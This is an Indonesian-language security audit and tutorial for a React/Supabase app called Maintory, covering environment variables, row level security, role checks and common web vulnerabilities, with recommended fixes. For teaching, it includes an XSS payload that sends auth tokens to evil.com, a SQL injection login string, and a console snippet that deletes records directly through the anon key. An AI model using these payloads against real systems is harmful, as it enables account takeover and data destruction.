# 🔐 02 — Keamanan (Security Audit & Belajar)

> **Dokumen ini adalah:** Audit keamanan + materi belajar untuk developer pemula yang membangun aplikasi **Maintory**.
> Ditulis dalam Bahasa Indonesia agar lebih mudah dipahami.

---

## Daftar Isi

1. [Apa itu Security untuk Web App?](#1-apa-itu-security-untuk-web-app)
2. [Audit Environment Variables](#2-audit-environment-variables)
3. [Apa itu Row Level Security (RLS)?](#3-apa-itu-row-level-security-rls)
4. [Audit Autentikasi & Otorisasi](#4-audit-autentikasi--otorisasi)
5. [Potensi Celah Keamanan](#5-potensi-celah-keamanan)
6. [Temuan Kritis](#6-temuan-kritis)
7. [Rekomendasi Perbaikan](#7-rekomendasi-perbaikan)

---

## 1. Apa itu Security untuk Web App?

### Konsep Dasar

Keamanan web app (web security) adalah serangkaian praktik yang memastikan bahwa:

- **Data pengguna tidak bocor** ke pihak yang tidak berhak
- **Hanya pengguna yang berwenang** yang bisa mengakses fitur atau data tertentu
- **Aplikasi tidak bisa dimanipulasi** oleh pihak jahat untuk melakukan hal yang tidak diinginkan

Bayangkan aplikasi web seperti sebuah **gedung kantor**:

| Analogi Gedung | Konsep Security Web |
|---|---|
| Pintu masuk dengan kartu akses | Autentikasi (login) |
| Hak akses per lantai/ruangan | Otorisasi (RBAC) |
| CCTV & buku tamu | Activity logging |
| Kunci brankas | Enkripsi data sensitif |
| Satpam di pintu | Rate limiting / firewall |

### Prinsip Dasar Security: Defense in Depth

> [!IMPORTANT]
> **Jangan pernah bergantung pada satu lapisan pertahanan saja.**
> Keamanan yang baik memiliki berlapis-lapis perlindungan. Jika satu lapisan ditembus, lapisan berikutnya masih melindungi.

```
[Browser/Client]
      ↓ RBAC di frontend (lapisan 1 - mudah di-bypass)
[Supabase API]
      ↓ JWT Token validation (lapisan 2)
      ↓ Row Level Security / RLS (lapisan 3 - pertahanan sesungguhnya)
[Database PostgreSQL]
```

### Apa yang Developer Pemula Sering Salah Pahami?

1. **"Kalau sudah ada login, berarti sudah aman"** → ❌ Salah. Login hanya memverifikasi identitas, bukan akses ke data.
2. **"Kode di frontend tidak bisa dilihat orang"** → ❌ Salah. Semua kode JavaScript yang dikirim ke browser BISA dibaca oleh siapa saja.
3. **"Variabel `.env` pasti aman"** → ❌ Tergantung. Ada variabel `.env` yang sengaja dikirim ke browser (VITE_), ada yang tidak.

---

## 2. Audit Environment Variables

### Apa itu Environment Variables?

Environment variable (variabel lingkungan) adalah nilai konfigurasi yang disimpan di luar kode program, biasanya di file `.env`. Tujuannya agar:

- Nilai sensitif (seperti password atau API key) tidak ikut ter-commit ke Git
- Konfigurasi bisa berbeda antara environment development dan production

### Bahaya VITE_ Prefix — WAJIB DIPAHAMI

> [!WARNING]
> **Semua variabel yang diawali `VITE_` di file `.env` akan di-bundle ke dalam JavaScript yang dikirim ke browser.**
> Artinya, siapapun yang membuka DevTools browser bisa melihatnya!

Ini bukan bug atau kelemahan Vite — ini adalah **desain yang disengaja** agar frontend bisa mengakses konfigurasi yang dibutuhkan. Yang berbahaya adalah jika kita menaruh secret yang **seharusnya tidak boleh diketahui publik** dengan prefix `VITE_`.

**Cara melihatnya di browser:**
1. Buka aplikasi Maintory di browser
2. Tekan `F12` → tab **Sources** atau **Network**
3. Cari file JavaScript yang di-bundle
4. Lakukan `Ctrl+F` → cari `SUPABASE` → semua nilai `VITE_` akan terlihat jelas

### Tabel Audit: Variabel .env Maintory

| Variabel | Prefix | Ada di Bundle? | Bahaya? | Penjelasan |
|---|---|---|---|---|
| `VITE_SUPABASE_URL` | `VITE_` | ✅ Ya | 🟢 Aman | URL publik Supabase, memang dirancang untuk diketahui client |
| `VITE_SUPABASE_ANON_KEY` | `VITE_` | ✅ Ya | 🟢 Aman | Anon key dilindungi oleh RLS. Siapapun bisa punya ini, tapi tidak bisa bypass RLS |
| `VITE_SUPABASE_SERVICE_KEY` | `VITE_` | ⚠️ Ya (jika ada) | 🔴 **KRITIS** | Service key melewati semua RLS. Jika pakai prefix `VITE_`, ini bencana |
| `SUPABASE_SERVICE_ROLE_KEY` | Tanpa `VITE_` | ❌ Tidak | 🟢 Aman | Hanya tersedia di server-side (Vercel/Node.js), tidak pernah sampai ke browser |

### Kondisi .env Maintory Saat Ini

```env
# File: .env (sudah di-gitignore ✅)

VITE_SUPABASE_URL=https://vjegrddqmzimqkaejhfo.supabase.co
VITE_SUPABASE_ANON_KEY=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...

# VITE_SUPABASE_SERVICE_KEY ← TIDAK ADA DI SINI (bagus!)
# SUPABASE_SERVICE_ROLE_KEY ← harus di-set di Vercel environment, bukan di .env lokal
```

**Status sekarang: 🟡 Sebagian Aman**
- `VITE_SUPABASE_URL` dan `VITE_SUPABASE_ANON_KEY` → wajar di frontend
- `VITE_SUPABASE_SERVICE_KEY` tidak ada di `.env` → bagus, tapi ada masalah di kode (lihat [Temuan Kritis](#6-temuan-kritis))

### Cara Kerja Anon Key vs Service Role Key

```
ANON KEY (kunci tamu)
├── Bisa diketahui publik
├── Setiap request masih dicek oleh RLS
└── Seperti: kartu pengunjung gedung — bisa masuk lobi, tapi tidak bisa masuk ruangan server

SERVICE ROLE KEY (kunci admin penuh)
├── RAHASIA MUTLAK — jangan pernah ke browser!
├── Melewati semua RLS, akses penuh ke database
└── Seperti: master key gedung — bisa buka semua pintu tanpa pengecualian
```

---

## 3. Apa itu Row Level Security (RLS)?

### Konsep Dasar RLS

Row Level Security (RLS) adalah fitur di database PostgreSQL (yang digunakan Supabase) yang memungkinkan kita membuat **aturan akses per baris data** langsung di level database.

Artinya, bahkan jika ada seseorang yang berhasil memanggil API Supabase secara langsung (misalnya lewat Postman), database tetap akan **menolak** akses ke baris data yang tidak diizinkan.

> [!IMPORTANT]
> **RLS adalah pertahanan sesungguhnya.** Validasi di frontend (RBAC, cek role, dsb) hanyalah "pengalaman pengguna" — mudah di-bypass. RLS yang berjalan di database tidak bisa di-bypass dari luar.

### Analogi Sederhana

Bayangkan sebuah perpustakaan:

- **Tanpa RLS**: Semua buku ada di rak terbuka. Siapapun yang masuk bisa ambil buku apapun.
- **Dengan RLS**: Ada aturan — "buku bertanda RAHASIA hanya bisa diambil oleh kepala perpustakaan". Aturan ini diterapkan langsung oleh sistem rak, bukan oleh penjaga pintu.

### Cara Kerja RLS di Supabase

```
Pengguna (browser)
      │
      │  Request: GET /from('maintenance_records')
      ▼
Supabase API
      │
      │  1. Cek JWT Token → siapa user ini?
      │  2. Terapkan RLS Policy untuk tabel ini
      ▼
PostgreSQL Database
      │
      │  RLS Policy contoh:
      │  "Tampilkan baris ini HANYA jika user_id = auth.uid()"
      ▼
Hasil yang dikembalikan: hanya baris milik user tersebut
```

### Contoh RLS Policy di Supabase

Ini adalah SQL yang biasanya ditulis di Supabase Dashboard → Table Editor → RLS:

```sql
-- Contoh: User hanya bisa lihat data maintenance milik mereka sendiri
CREATE POLICY "Users can view own records"
ON maintenance_records
FOR SELECT
USING (auth.uid() = user_id);

-- Contoh: Hanya admin yang bisa hapus data
CREATE POLICY "Only admin can delete"
ON maintenance_records
FOR DELETE
USING (
  EXISTS (
    SELECT 1 FROM profiles
    WHERE profiles.id = auth.uid()
    AND profiles.role IN ('admin', 'superadmin')
  )
);
```

### Mengapa RLS Penting untuk Maintory?

Maintory memiliki 4 role pengguna: `superadmin`, `admin`, `teknisi`, dan `backbone`. Pembatasan akses antar role **harus** diterapkan di RLS, bukan hanya di kode React.

> [!NOTE]
> Jika RLS belum diatur dengan benar di Supabase, siapapun yang punya `ANON_KEY` bisa memanggil API Supabase langsung dan mendapatkan data yang seharusnya tidak bisa mereka akses.

---

## 4. Audit Autentikasi & Otorisasi

### 4.1 Alur Login Maintory

Maintory menggunakan pendekatan unik: login dengan **username**, bukan email. Ini dilakukan dengan "trik" mengkonversi username menjadi email fiktif:

```js
// File: src/context/AuthContext.jsx
async function login(username, password) {
  const cleanUsername = username.trim().toLowerCase()

  // Konversi: "budi" → "budi@maintory.local"
  const email = `${cleanUsername}@maintory.local`

  const { data, error } = await supabase.auth.signInWithPassword({
    email,      // email fiktif yang dibuat dari username
    password,
  })
}
```

**Mengapa ini dilakukan?**
Supabase Auth secara default menggunakan email sebagai identifier. Karena Maintory ingin menggunakan username, developer membuat "email palsu" dengan domain `@maintory.local` sebagai cara menyiasatinya.

**Apakah ini aman?**
- ✅ Secara teknis berfungsi dan password tetap di-hash oleh Supabase
- ⚠️ Tidak ada validasi format username yang ketat
- ⚠️ Tidak ada rate limiting — percobaan login bisa dilakukan tanpa batas

### Diagram Alur Login

```mermaid
sequenceDiagram
    participant U as Browser (User)
    participant AC as AuthContext.jsx
    participant SB as Supabase Auth
    participant DB as Database (PostgreSQL)

    U->>AC: login("budi", "password123")
    AC->>AC: cleanUsername = "budi"
    AC->>AC: email = "budi@maintory.local"
    AC->>SB: signInWithPassword({email, password})
    SB->>DB: Cek hash password untuk email ini
    DB-->>SB: Password cocok ✅
    SB-->>AC: Kembalikan JWT Token + user data
    AC->>AC: Simpan session ke localStorage
    AC-->>U: Login berhasil, redirect ke dashboard
```

### 4.2 Role-Based Access Control (RBAC) di Frontend

Maintory mengimplementasikan RBAC di file `permissions.js`:

```js
// File: src/lib/permissions.js
export const can = (role, action) => {
  const permissions = {
    // Siapa yang boleh menghapus data maintenance?
    'maintenance.delete': ['superadmin', 'admin'],

    // Siapa yang boleh import stok?
    'inventory.stok.import': ['superadmin'],

    // Siapa yang boleh hapus log aktivitas?
    'log.delete': ['superadmin'],

    // Siapa yang boleh kelola user?
    'settings.users': ['superadmin'],

    // ... 40+ aturan permission lainnya
  }

  return permissions[action]?.includes(role) ?? false
}
```

**Cara penggunaan di komponen:**
```jsx
// Di komponen React
import { can } from '../lib/permissions'
import { useAuth } from '../context/AuthContext'

function MaintenanceTable() {
  const { profile } = useAuth() // profile.role = "teknisi"

  return (
    <div>
      {/* Tombol delete hanya muncul jika role diizinkan */}
      {can(profile.role, 'maintenance.delete') && (
        <button onClick={handleDelete}>Hapus</button>
      )}
    </div>
  )
}
```

### 4.3 Masalah KRITIS: RBAC Frontend Mudah Di-bypass

> [!CAUTION]
> **RBAC di frontend hanyalah ilusi keamanan.** Siapapun bisa membuka browser DevTools, mengubah variabel JavaScript, atau memanggil API Supabase langsung tanpa melalui antarmuka Maintory.

**Simulasi serangan sederhana (hanya untuk pembelajaran):**

```js
// Seseorang membuka browser DevTools → Console
// Mereka memanggil Supabase API langsung, melewati semua cek can() di React

const { createClient } = await import('https://esm.sh/@supabase/supabase-js')
const supabase = createClient(
  'URL_yang_terlihat_di_source_code',
  'ANON_KEY_yang_terlihat_di_source_code'
)

// Jika RLS belum diatur, ini bisa berhasil!
await supabase.from('maintenance_records').delete().eq('id', '123')
```

**Solusi:** RLS di Supabase harus mencerminkan semua aturan yang ada di `permissions.js`. RBAC frontend hanya untuk UX (menyembunyikan tombol), bukan untuk keamanan sungguhan.

### 4.4 Matrik RBAC vs RLS

| Lapisan | Berlokasi | Bisa Di-bypass? | Fungsi Sebenarnya |
|---|---|---|---|
| RBAC (permissions.js) | Frontend / Browser | ✅ Mudah | Menyembunyikan tombol/fitur di UI |
| RLS (Supabase) | Database | ❌ Tidak bisa | Membatasi akses data secara nyata |

---

## 5. Potensi Celah Keamanan

### 5.1 SQL Injection

**Apa itu?** Serangan di mana penyerang memasukkan perintah SQL berbahaya melalui form input untuk memanipulasi database.

**Contoh serangan klasik:**
```sql
-- Input di form login:
Username: admin'--
-- Akibatnya query menjadi: SELECT * FROM users WHERE username = 'admin'--' AND password = '...'
-- Bagian password ter-comment-out, login berhasil tanpa password!
```

**Status Maintory: 🟢 AMAN**

Maintory menggunakan Supabase JavaScript SDK, bukan query SQL mentah. SDK ini secara otomatis menggunakan *parameterized queries* yang mencegah SQL injection:

```js
// Ini yang ditulis developer:
const { data } = await supabase
  .from('maintenance_records')
  .select('*')
  .eq('id', userInput) // userInput di-escape secara otomatis

// SDK secara internal menghasilkan query yang aman:
// SELECT * FROM maintenance_records WHERE id = $1
// dengan $1 = userInput (tidak pernah dieksekusi sebagai SQL)
```

### 5.2 Cross-Site Scripting (XSS)

**Apa itu?** Serangan di mana penyerang menyisipkan kode JavaScript berbahaya ke dalam halaman web, yang kemudian dijalankan di browser pengguna lain.

**Contoh serangan:**
```html
<!-- Penyerang mengisi form "nama peralatan" dengan: -->
<script>
  // Curi token semua user yang melihat halaman ini
  fetch('https://evil.com/steal?token=' + localStorage.getItem('supabase.auth.token'))
</script>
```

**Status Maintory: 🟡 Sebagian Aman**

- ✅ React secara default melakukan *escaping* pada semua nilai yang dirender di JSX
- ✅ Teks yang ditampilkan dengan `{variabel}` di JSX tidak akan dieksekusi sebagai HTML
- ⚠️ Jika ada penggunaan `dangerouslySetInnerHTML`, itu perlu dicek

```jsx
// ✅ AMAN — React otomatis escape
<p>{userInput}</p>

// ⚠️ BERBAHAYA — jangan gunakan kecuali input sudah di-sanitize
<p dangerouslySetInnerHTML={{ __html: userInput }} />
```

### 5.3 CSRF (Cross-Site Request Forgery)

**Apa itu?** Serangan di mana website jahat membuat browser pengguna yang sedang login mengirimkan request ke aplikasi target tanpa sepengetahuan pengguna.

**Status Maintory: 🟢 AMAN (secara inherent)**

Maintory adalah SPA (Single Page Application) yang memanggil Supabase langsung menggunakan **JWT Bearer Token** di header `Authorization`:

```
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
```

CSRF hanya efektif terhadap sistem yang menggunakan *cookie-based authentication*. Karena Supabase menggunakan token di header, browser tidak akan secara otomatis menyertakan token ini saat mengunjungi website berbahaya. Jadi **Maintory tidak rentan terhadap CSRF klasik**.

> [!NOTE]
> Ini adalah salah satu keuntungan arsitektur "SPA + JWT" dibandingkan "server-rendered + session cookie".

### 5.4 Rate Limiting (Brute Force Login)

**Apa itu?** Penyerang mencoba ribuan kombinasi password secara otomatis sampai berhasil masuk.

**Status Maintory: 🔴 BELUM ADA DI FRONTEND**

```js
// AuthContext.jsx — tidak ada pembatasan percobaan login
async function login(username, password) {
  // Tidak ada: hitungan percobaan gagal
  // Tidak ada: delay setelah X kali gagal
  // Tidak ada: captcha
  // Tidak ada: lockout otomatis

  const { data, error } = await supabase.auth.signInWithPassword({ email, password })
}
```

**Mitigasi yang ada:**
- ✅ Supabase secara default memiliki built-in rate limiting di sisi server
- ⚠️ Tapi tidak ada feedback yang jelas ke pengguna (misalnya "akun terkunci 30 menit")

### 5.5 Input Validation

**Status Maintory: 🟡 Minimal**

Form menggunakan state React tanpa library validasi seperti Zod, Yup, atau React Hook Form:

```jsx
// Pendekatan saat ini — validasi manual, minimal
const [username, setUsername] = useState('')

const handleSubmit = () => {
  if (!username) {
    setError('Username wajib diisi')
    return
  }
  // Tidak ada: cek panjang maksimum
  // Tidak ada: cek karakter tidak valid
  // Tidak ada: sanitasi input
  login(username, password)
}
```

**Contoh dengan Zod (rekomendasi):**
```js
import { z } from 'zod'

const loginSchema = z.object({
  username: z.string()
    .min(3, 'Username minimal 3 karakter')
    .max(50, 'Username maksimal 50 karakter')
    .regex(/^[a-z0-9_]+$/, 'Hanya huruf kecil, angka, dan underscore'),
  password: z.string()
    .min(8, 'Password minimal 8 karakter')
})
```

### 5.6 Activity Logging (Hal yang Sudah Baik ✅)

Maintory sudah mengimplementasikan sistem logging aktivitas yang baik:

```js
// File: src/lib/logActivity.js
export async function logActivity({ userId, username, role, module, action, detail }) {
  await supabase.from('activity_logs').insert({
    user_id: userId,
    username: username,
    role: role,
    module: module,    // contoh: 'maintenance', 'inventory'
    action: action,    // contoh: 'create', 'update', 'delete'
    detail: detail,    // deskripsi detail aksi
    created_at: new Date().toISOString()
  })
}
```

**Manfaat logging ini:**
- 📋 Audit trail: bisa lacak siapa melakukan apa dan kapan
- 🔍 Deteksi anomali: jika ada aktivitas mencurigakan bisa ditelusuri
- ⚖️ Akuntabilitas: pengguna bertanggung jawab atas setiap aksi mereka

> [!TIP]
> Ini adalah praktik keamanan yang sangat baik! Pastikan tabel `activity_logs` juga dilindungi dengan RLS — hanya `superadmin` yang bisa melihat semua log, dan user biasa hanya bisa melihat log miliknya sendiri.

---

## 6. Temuan Kritis

### ⚠️ TEMUAN #1: `supabaseAdmin.js` Menggunakan Prefix `VITE_` untuk Service Key

> [!CAUTION]
> **INI ADALAH TEMUAN PALING BERBAHAYA DALAM AUDIT INI.**
> Walaupun saat ini `VITE_SUPABASE_SERVICE_KEY` tidak ada di file `.env`, kode yang menggunakan prefix ini adalah **bom waktu** — satu kesalahan konfigurasi bisa menyebabkan kebocoran total database.

**Kode yang bermasalah:**

```js
// File: src/lib/supabaseAdmin.js
// ⚠️ FILE INI ADA DI FOLDER src/ — ARTINYA INI ADALAH CLIENT-SIDE CODE!

import { createClient } from '@supabase/supabase-js'

const supabaseUrl = import.meta.env.VITE_SUPABASE_URL
const serviceRoleKey = import.meta.env.VITE_SUPABASE_SERVICE_KEY
//                     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
//                     PREFIX "VITE_" → nilai ini akan terlihat di browser!
//                     Jika key ini pernah dimasukkan ke .env dengan prefix VITE_,
//                     SIAPAPUN YANG BUKA DEVTOOLS BISA MELIHATNYA

export const supabaseAdmin = serviceRoleKey
  ? createClient(supabaseUrl, serviceRoleKey, {
      auth: { autoRefreshToken: false, persistSession: false }
    })
  : null
// Saat ini null karena VITE_SUPABASE_SERVICE_KEY tidak ada di .env
// Tapi kode ini siap "meledak" kapan saja
```

**Bandingkan dengan yang BENAR di server-side:**

```js
// File: api/createUser.js — INI BENAR ✅
// File ini ada di folder api/ → dieksekusi oleh Vercel sebagai serverless function
// Tidak pernah dikirim ke browser!

const serviceRoleKey = process.env.SUPABASE_SERVICE_ROLE_KEY
//                     ^^^^^^^^^^^
//                     Tanpa VITE_ prefix → hanya tersedia di server
```

**Diagram risiko:**

```mermaid
graph TD
    A["File: src/lib/supabaseAdmin.js"] --> B{"VITE_SUPABASE_SERVICE_KEY\nada di .env?"}
    B -->|"Tidak ada (kondisi sekarang)"| C["supabaseAdmin = null\n⚠️ Fitur admin tidak berfungsi\ntapi setidaknya key tidak bocor"]
    B -->|"Ada tanpa VITE_ prefix"| D["Tidak mungkin\nimport.meta.env tidak bisa\nbaca variabel tanpa VITE_"]
    B -->|"Ada dengan VITE_ prefix"| E["BENCANA!\nService key terekspos\ndi JavaScript bundle\nSiapapun bisa akses database penuh"]

    style E fill:#ff4444,color:#fff
    style C fill:#ffaa00,color:#000
    style D fill:#44aa44,color:#fff
```

**Dampak jika Service Key bocor:**

| Dampak | Deskripsi |
|---|---|
| 🔴 Akses database penuh | Penyerang bisa baca/tulis/hapus SEMUA data |
| 🔴 Bypass semua RLS | Tidak ada kebijakan keamanan yang berlaku |
| 🔴 Buat/hapus user | Manipulasi akun pengguna secara bebas |
| 🔴 Data leak | Semua data maintenance, inventory, user bocor |

**Solusi yang benar:**

Operasi yang membutuhkan service role key **harus** dipindah ke server-side:

```
❌ SALAH: src/lib/supabaseAdmin.js (client-side, terbundle ke browser)
✅ BENAR: api/createUser.js (server-side, Vercel function, tidak pernah ke browser)
```

---

### ⚠️ TEMUAN #2: RBAC Frontend Tanpa Penegakan RLS yang Verified

Sistem `permissions.js` dengan 40+ aturan permission bagus untuk UX, namun jika RLS di Supabase tidak mencerminkan aturan yang sama, sistem permission ini tidak memberikan keamanan nyata.

**Contoh risiko:**

```
Aturan di permissions.js:
'maintenance.delete': ['superadmin', 'admin']

Jika RLS di Supabase untuk DELETE pada tabel maintenance_records tidak diatur,
seorang teknisi bisa langsung memanggil:
  supabase.from('maintenance_records').delete().eq('id', targetId)
...dan berhasil menghapus, walaupun tombol "Hapus" tersembunyi di UI-nya.
```

---

### ⚠️ TEMUAN #3: Tidak Ada Rate Limiting di Frontend

Login bisa dicoba berkali-kali tanpa ada pembatasan waktu atau hitungan dari sisi aplikasi.

---

## 7. Rekomendasi Perbaikan

Rekomendasi diurutkan berdasarkan tingkat urgensi:

### 🔴 KRITIS — Harus Segera Diperbaiki

#### Fix #1: Pindahkan atau Hapus `supabaseAdmin.js` dari Folder `src/`

File `src/lib/supabaseAdmin.js` **tidak seharusnya ada di folder `src/`** karena ini adalah client-side code. Ada dua pilihan:

**Opsi A: Hapus file dan pastikan semua operasi admin via API route**

```
Sebelum: src/lib/supabaseAdmin.js (❌ client-side)
Sesudah: api/adminAction.js       (✅ server-side Vercel function)
```

**Opsi B: Jika file tetap dipertahankan, tambahkan guard yang ketat**

```js
// src/lib/supabaseAdmin.js — versi yang lebih aman
// ⚠️ PERINGATAN: File ini HANYA boleh digunakan jika TIDAK di-bundle ke browser
// Gunakan ini hanya untuk server-side rendering atau API routes

if (typeof window !== 'undefined') {
  // Kita ada di browser — TOLAK dengan tegas
  throw new Error(
    'KEAMANAN: supabaseAdmin tidak boleh digunakan di client-side! ' +
    'Pindahkan operasi ini ke API route.'
  )
}

// Gunakan process.env (bukan import.meta.env) — tidak akan di-bundle ke browser
const serviceRoleKey = process.env.SUPABASE_SERVICE_ROLE_KEY
```

**Opsi C: Ganti prefix variabel (paling minimal)**

```env
# .env — JANGAN gunakan prefix VITE_ untuk service key
# ❌ SALAH:
VITE_SUPABASE_SERVICE_KEY=eyJ...

# ✅ BENAR (tapi file tetap harus di api/, bukan src/):
SUPABASE_SERVICE_ROLE_KEY=eyJ...
```

---

### 🟠 PENTING — Sebaiknya Diperbaiki

#### Fix #2: Audit dan Lengkapi RLS di Supabase

Periksa setiap tabel di Supabase dan pastikan RLS sudah diaktifkan dan mencerminkan aturan `permissions.js`:

**Checklist per tabel:**

```
□ maintenance_records
  □ SELECT: user hanya bisa lihat record yang relevan dengan role-nya
  □ INSERT: minimal role teknisi
  □ UPDATE: minimal role teknisi (record miliknya sendiri)
  □ DELETE: hanya superadmin dan admin

□ inventory_items
  □ SELECT: semua role bisa baca
  □ INSERT/UPDATE: minimal role admin
  □ DELETE: hanya superadmin

□ activity_logs
  □ SELECT: superadmin bisa lihat semua, user lain hanya miliknya
  □ INSERT: semua authenticated user (untuk logging)
  □ UPDATE/DELETE: hanya superadmin

□ profiles / users
  □ SELECT: user bisa lihat profilnya sendiri, superadmin bisa lihat semua
  □ UPDATE: user bisa update profilnya sendiri (kecuali kolom role)
  □ DELETE: hanya superadmin
```

#### Fix #3: Tambahkan Validasi Input dengan Zod

```bash
npm install zod
```

```js
// Contoh implementasi di form login
import { z } from 'zod'

const loginSchema = z.object({
  username: z.string()
    .min(3, 'Username minimal 3 karakter')
    .max(50, 'Username terlalu panjang')
    .regex(/^[a-zA-Z0-9_]+$/, 'Username hanya boleh huruf, angka, dan underscore'),
  password: z.string()
    .min(6, 'Password minimal 6 karakter')
    .max(100, 'Password terlalu panjang')
})

async function handleLogin(username, password) {
  const result = loginSchema.safeParse({ username, password })
  if (!result.success) {
    setError(result.error.errors[0].message)
    return
  }
  await login(result.data.username, result.data.password)
}
```

---

### 🟡 NICE TO HAVE — Perbaikan Jangka Panjang

#### Fix #4: Tambahkan Rate Limiting di Frontend

```js
// Implementasi sederhana tanpa library tambahan
const MAX_ATTEMPTS = 5
const LOCKOUT_DURATION = 15 * 60 * 1000 // 15 menit

function useLoginRateLimit() {
  const [attempts, setAttempts] = useState(0)
  const [lockedUntil, setLockedUntil] = useState(null)

  const isLocked = lockedUntil && Date.now() < lockedUntil

  const recordFailedAttempt = () => {
    const newAttempts = attempts + 1
    setAttempts(newAttempts)
    if (newAttempts >= MAX_ATTEMPTS) {
      setLockedUntil(Date.now() + LOCKOUT_DURATION)
    }
  }

  const resetAttempts = () => {
    setAttempts(0)
    setLockedUntil(null)
  }

  return { isLocked, lockedUntil, recordFailedAttempt, resetAttempts }
}
```

#### Fix #5: Security Headers

Tambahkan security headers di `vercel.json`:

```json
{
  "headers": [
    {
      "source": "/(.*)",
      "headers": [
        { "key": "X-Content-Type-Options", "value": "nosniff" },
        { "key": "X-Frame-Options", "value": "DENY" },
        { "key": "X-XSS-Protection", "value": "1; mode=block" },
        { "key": "Referrer-Policy", "value": "strict-origin-when-cross-origin" }
      ]
    }
  ]
}
```

#### Fix #6: Sembunyikan Informasi Error yang Sensitif

```js
// ❌ Jangan tampilkan error mentah dari Supabase ke user
setError(error.message) // Bisa mengandung info internal

// ✅ Tampilkan pesan yang sudah disaring
const getLoginErrorMessage = (error) => {
  if (error.message.includes('Invalid login credentials')) {
    return 'Username atau password salah'
  }
  if (error.message.includes('Email not confirmed')) {
    return 'Akun belum diverifikasi'
  }
  // Untuk error lain, log ke console tapi tampilkan pesan generik
  console.error('Login error:', error)
  return 'Terjadi kesalahan, coba lagi nanti'
}
```

---

## Ringkasan Temuan

| # | Temuan | Tingkat Risiko | Status |
|---|---|---|---|
| 1 | `supabaseAdmin.js` pakai prefix `VITE_` untuk service key | 🔴 KRITIS | Harus diperbaiki |
| 2 | RBAC hanya di frontend, belum tentu RLS sudah lengkap | 🟠 PENTING | Perlu diverifikasi |
| 3 | Tidak ada rate limiting login di frontend | 🟠 PENTING | Diperbaiki jika ada waktu |
| 4 | Tidak ada library validasi input (Zod/Yup) | 🟡 MEDIUM | Nice to have |
| 5 | SQL Injection | 🟢 AMAN | SDK Supabase melindungi |
| 6 | XSS | 🟢 SEBAGIAN AMAN | React melindungi (selama tidak pakai dangerouslySetInnerHTML) |
| 7 | CSRF | 🟢 AMAN | JWT Bearer Token tidak rentan CSRF klasik |
| 8 | Activity Logging | ✅ BAIK | Sudah diimplementasikan |

---

> **Catatan Akhir untuk Developer:**
> Keamanan adalah proses yang berkelanjutan, bukan sesuatu yang "selesai" sekali lalu dilupakan.
> Mulai dari **Temuan #1** (supabaseAdmin.js) karena ini yang paling berbahaya.
> Setelah itu, **verifikasi RLS** di Supabase Dashboard untuk setiap tabel.
> Dua langkah ini sudah memberikan perlindungan yang jauh lebih baik untuk Maintory. 🛡️

---

*Dokumen ini dibuat sebagai bagian dari seri **Maintory — Belajar Web Development**.*
*Untuk pertanyaan atau klarifikasi, rujuk kembali ke kode sumber di folder `src/` dan `api/`.*
